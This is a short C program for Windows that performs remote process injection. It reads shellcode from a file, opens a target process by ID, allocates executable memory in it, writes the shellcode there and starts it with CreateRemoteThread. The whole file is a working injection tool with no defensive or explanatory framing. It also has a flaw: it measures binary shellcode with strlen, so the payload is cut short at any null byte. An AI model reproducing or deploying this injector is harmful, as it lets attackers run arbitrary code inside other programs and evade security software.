#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>

char* read_shellcode(char* filename)
{
    FILE* fp;
    long lSize;
    char* buffer;

    if (fopen_s(&fp, filename, "rb") != 0) return NULL;

    fseek(fp, 0L, SEEK_END);
    lSize = ftell(fp);
    rewind(fp);

    buffer = (char*)malloc(lSize + 1);
    if (!buffer) return NULL;

    fread(buffer, lSize, 1, fp);
    fclose(fp);

    buffer[lSize] = '\0';
    return buffer;
}


int main(int argc, char* argv[])
{
    if (argc < 3)
    {
        printf("Usage: %s <process id> <shellcode file>\n", argv[0]);
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (process == NULL)
    {
        printf("Error: could not open process %d\n", pid);
        return 1;
    }

    char* shellcode = read_shellcode(argv[2]);

    LPVOID remote_buffer = VirtualAllocEx(process, NULL, strlen(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (remote_buffer == NULL)
    {
        printf("Error: could not allocate remote buffer\n");
        return 1;
    }

    if (!WriteProcessMemory(process, remote_buffer, shellcode, strlen(shellcode), NULL))
    {
        printf("Error: could not write shellcode to remote buffer\n");
        return 1;
    }

    HANDLE thread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)remote_buffer, NULL, 0, NULL);

    if (thread == NULL)
    {
        printf("Error: could not create remote thread\n");
        return 1;
    }

    printf("Successfully injected shellcode into process %d\n", pid);

    CloseHandle(process);

    return 0;
}
